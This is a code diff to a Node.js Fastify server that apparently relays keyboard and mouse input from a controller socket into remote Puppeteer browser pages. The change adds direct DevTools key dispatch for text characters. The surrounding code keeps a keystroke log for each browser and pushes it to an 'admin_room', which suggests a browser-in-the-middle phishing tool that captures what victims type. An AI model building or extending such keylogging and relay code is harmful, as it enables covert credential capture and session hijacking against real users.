@@ -315,13 +315,31 @@ fastify.ready(async function(err){
           browser.keylog = new_val
           fastify.io.to('admin_room').emit('keylog', browser.browser_id, new_val)
         }
-        await browser.target_page.keyboard.down(key)
+        const istext = key.length === 1 ? true: false;
+        if(istext){
+          await browser.target_page._client.send('Input.dispatchKeyEvent', {
+            type: 'keyDown',
+            key: key,
+            text: key,
+          })
+        }else if (key != 'Dead'){
+          await browser.target_page.keyboard.down(key)
+        }
       }
     })
     socket.on("keyup", async function(key){
       const browser = browsers.get('controller_socket', socket.id)
       if(browser){
-        await browser.target_page.keyboard.up(key)
+        const istext = key.length === 1 ? true: false;
+        if(istext){
+          await browser.target_page._client.send('Input.dispatchKeyEvent', {
+            type: 'keyUp',
+            key: key,
+            text: key,
+          })
+        }else if(key != 'Dead'){
+          await browser.target_page.keyboard.up(key)
+        }
       }
     })
     socket.on("mouse_event", async function(mouse_event){
